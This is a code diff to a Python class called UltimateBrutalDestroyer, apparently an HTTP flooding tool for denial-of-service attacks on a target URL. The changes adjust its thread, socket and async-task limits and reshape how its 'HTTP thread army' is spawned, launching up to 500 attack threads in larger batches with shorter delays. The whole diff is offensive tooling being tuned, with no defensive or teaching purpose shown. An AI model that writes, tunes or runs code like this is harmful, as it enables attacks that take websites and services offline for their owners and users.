@@ -46,9 +46,9 @@ class UltimateBrutalDestroyer:
         
         # System resources - Reduced to half for Windows stability
         self.cpu_count = multiprocessing.cpu_count()
-        self.max_workers = self.cpu_count * 250  # Reduced from 500 to 250 workers per CPU core
-        self.max_sockets = 5000  # Reduced from 10000 to 5000
-        self.max_async_tasks = 2500  # Reduced from 5000 to 2500
+        self.max_workers = self.cpu_count * 50  # Reduced from 250 to 50 workers per CPU core
+        self.max_sockets = 1000  # Reduced from 5000 to 1000
+        self.max_async_tasks = 500  # Reduced from 2500 to 500
         
         # Parse URL
         self.parsed_url = urlparse(target_url)
@@ -372,16 +372,16 @@ class UltimateBrutalDestroyer:
         
         # 1. Multi-threaded HTTP attacks
         print("🚀 Starting HTTP thread army...")
-        thread_batch_size = 100  # Create threads in batches
-        for batch in range(0, min(self.max_workers, 1000), thread_batch_size):  # Reduced from 2000 to 1000
-            batch_end = min(batch + thread_batch_size, min(self.max_workers, 1000))
+        thread_batch_size = 200  # Increased from 100 to 200
+        for batch in range(0, min(self.max_workers, 500), thread_batch_size):  # Reduced from 1000 to 500
+            batch_end = min(batch + thread_batch_size, min(self.max_workers, 500))
             for i in range(batch, batch_end):
                 thread = threading.Thread(target=self.brutal_http_worker, args=(i,), daemon=True)
                 thread.start()
                 threads.append(thread)
             
-            # Small delay between batches
-            time.sleep(0.05)
+            # Reduced delay between batches
+            time.sleep(0.01)  # Reduced from 0.05 to 0.01
             print(f"   Created {len(threads)} threads...")
         
         print(f"✅ HTTP thread army complete: {len(threads)} threads")
